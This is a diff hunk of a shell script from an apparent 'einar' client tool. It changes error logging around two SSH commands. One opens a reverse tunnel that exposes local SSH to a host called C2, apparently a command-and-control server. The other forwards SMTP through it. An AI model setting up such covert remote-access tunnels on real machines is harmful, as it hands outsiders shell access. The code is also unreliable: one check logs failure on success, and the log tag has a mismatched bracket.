@@ -14,13 +14,13 @@ source /opt/einar/client/config.sh
 ## This needs to be switched to tunnelup (a separate script)
 sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
 if [ $? == 1 ]; then 
-		MSG .= "Failed to establish SSH  Tunnel"
+		$LOG "[EINAR} Failed to establish SSH  Tunnel"
 	fi
 	
 	# This needs to be a separate script called something like mailtunnel.sh 
 	sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
 	if [ $? -eq 0 ]; then
-		MSG .= "Failed to establish SMTP Tunnel"
+		$LOG "[EINAR} Failed to establish SMTP Tunnel"
 	fi
 	
 
